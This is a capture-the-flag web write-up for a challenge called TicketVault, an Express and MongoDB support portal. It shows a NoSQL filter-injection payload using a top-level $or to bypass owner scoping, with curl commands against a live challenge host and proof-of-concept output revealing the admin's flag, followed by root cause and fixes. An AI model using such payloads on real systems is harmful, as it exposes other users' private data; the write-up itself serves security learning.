# TicketVault — Writeup

**Category:** Web
**Target:** http://144.217.91.111:3001
**Flag:** `CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}`

## Challenge

TicketVault is a small internal "support portal" built with Express +
MongoDB + express-session. Each user registers, logs in, creates tickets
(subject/content) and can only view their own tickets. The hint says the
admin has a ticket containing the flag, and points at the ticket-fetch
route and access-control logic.

Provided source: `server.js` + `package.json` (no `db.js` /
`utils/sanitize.js` / `utils/ticketFilter.js` were included, so those had
to be inferred/confirmed against the live server).

## Recon

Reading `server.js`, the relevant routes are:

```js
app.get('/tickets', requireAuth, async (req, res) => {
  const db = getDb();
  const tickets = await db.collection('tickets').find({ owner: req.session.username }).toArray();
  res.render('tickets', { tickets, username: req.session.username, q: '' });
});

app.get('/tickets/search', requireAuth, async (req, res) => {
  const db = getDb();
  const filter = buildScopedFilter(req);
  const tickets = await db.collection('tickets').find(filter).toArray();
  res.render('tickets', { tickets, username: req.session.username, q: req.query.q || '' });
});
```

`/tickets` hard-codes `{ owner: req.session.username }` — that route is
safe. `/tickets/search`, however, delegates the whole filter construction
to `buildScopedFilter(req)` from `utils/ticketFilter.js` (not included in
the handout, so its behavior had to be probed against the live app).

The rendered `/tickets` page revealed an "Advanced filter (JSON, power
users)" input bound to a `filter` query parameter:

```html
<form method="GET" action="/tickets/search">
  <input type="text" name="q" placeholder="Search subject...">
  <details>
    <summary>Advanced filter (JSON, power users)</summary>
    <input type="text" name="filter" placeholder='{"subject": "printer"}'>
  </details>
  <button type="submit">Search</button>
</form>
```

This is a classic shape for a **NoSQL filter-injection / broken access
control** bug: the server accepts a raw, attacker-controlled MongoDB
filter object and merges it with a "scoping" clause that is supposed to
force `owner == <current user>`.

## Vulnerability

By experimentation against the live `/tickets/search` endpoint (two test
accounts, each with one distinctively-named ticket) I determined exactly
how the scoping breaks:

- Supplying `filter={"owner":"<other_user>"}` **did not** work — the
  server still only returned the caller's own ticket. So a direct
  top-level `owner` key in the attacker's JSON gets overridden/ignored by
  the forced scope (e.g. `{ ...parsedFilter, owner: session.username }`,
  or an explicit re-assignment after parsing).
- Supplying a filter containing a **MongoDB operator key at the top
  level**, specifically `$or`, bypassed the scoping entirely:

  ```
  GET /tickets/search?filter={"$or":[{"owner":"<other_user>"},{"owner":"<me>"}]}
  ```

  returned **both** users' tickets — i.e. as soon as `$or` is present,
  `buildScopedFilter` stops enforcing `owner == session.username` as an
  AND-ed constraint (most likely its "sanitizer" detects a `$`-prefixed
  key and takes an unsafe fallback path — e.g. skipping/short-circuiting
  the owner-scoping logic instead of rejecting the request — rather than
  properly combining it, e.g. via `$and: [{owner: me}, parsedFilter]`).

This means **any authenticated user can read every ticket in the
database**, including the admin's, by sending an `$or` filter that is
always true for every document:

```
GET /tickets/search?filter={"$or":[{"owner":{"$exists":true}}]}
```

This is a textbook IDOR/broken-access-control bug caused by trusting a
user-supplied MongoDB query object without enforcing the ownership
constraint as a non-overridable top-level AND.

## Exploit

1. Register a throwaway account (no privileges needed beyond
   authentication — `requireAuth` only checks `req.session.username` is
   set).
2. Request `/tickets/search` with a `filter` query parameter containing
   a top-level `$or` clause that matches all documents.
3. Parse the HTML response for the ticket whose `owner` is exactly
   `admin`.

```bash
# 1. Register
curl -s -c ck.txt -X POST http://144.217.91.111:3001/register \
  -d "username=exploit_user&password=pass123"

# 2. Dump every ticket via the $or-based scope bypass
curl -s -G -b ck.txt "http://144.217.91.111:3001/tickets/search" \
  --data-urlencode 'filter={"$or":[{"owner":{"$exists":true}}]}' \
  -o alltickets.html

# 3. Extract admin's ticket
grep -i -B2 -A2 'owner: admin<' alltickets.html
```

Full automated PoC: `/home/le_geek/bugpwn/TicketVault/exploit.py`

```
$ python3 -I exploit.py http://144.217.91.111:3001
[+] Registered/logged in as exploit_279744
[+] Requesting: http://144.217.91.111:3001/tickets/search?filter=%7B%22%24or%22...
[!] Found admin's ticket:
    subject: Root cause analysis - incident 2024-03
    content: Postmortem notes for the March incident. Access recovery token: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}

[FLAG] CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}
```

Note: the dumped ticket list also contained several decoy/"canary"
tickets planted by other competitors (owners like `admin123`,
`adminka`, `falsifier_...`, `audit_t0021_reviewer`) embedding fake
flags such as `CTF{deadbeefcafebabe0123456789abcdef}` and
`CTF{audit_canary_0000_deadbeef}`, with content explicitly stating
"should only count if owner is us." These were filtered out by
checking the ticket's `owner` field is the literal string `admin` —
only one ticket satisfies that, and its content is the real flag.

## Flag

```
CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}
```

(Confirmed in the ticket titled "Root cause analysis - incident
2024-03", `owner: admin`, content: "Postmortem notes for the March
incident. Access recovery token: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}")

## Root cause

`GET /tickets/search` passes a fully attacker-controlled, parsed-JSON
MongoDB filter straight into `db.collection('tickets').find(filter)`
after an attempt to "scope" it to the logged-in user. The scoping logic
is not robust against top-level operator keys (`$or`, likely also `$and`,
`$nor`, etc.) supplied by the client, allowing the ownership constraint
to be dropped and turning a "search my tickets" feature into an
unauthenticated-for-data-purposes read of the entire `tickets`
collection.

## Lessons / Fix

- **Never pass user-supplied filter objects to a database driver**,
  even "for power users." If a flexible search is required, whitelist
  the specific fields/operators allowed (e.g. only `subject: {$regex}`)
  and build the Mongo query entirely server-side.
- If scoping must be merged with a user filter, make the ownership
  constraint **non-overridable and non-combinable**, e.g.:
  ```js
  const userFilter = sanitize(parsedFilter); // strip $-prefixed top-level keys
  const scoped = { $and: [{ owner: req.session.username }, userFilter] };
  ```
  and reject/strip any `$`-prefixed keys in `userFilter` rather than
  silently disabling the scope when one is detected.
- Add tests asserting that `/tickets/search` never returns documents
  with `owner != session.username`, including with adversarial
  `$or`/`$where`/`$exists` payloads.
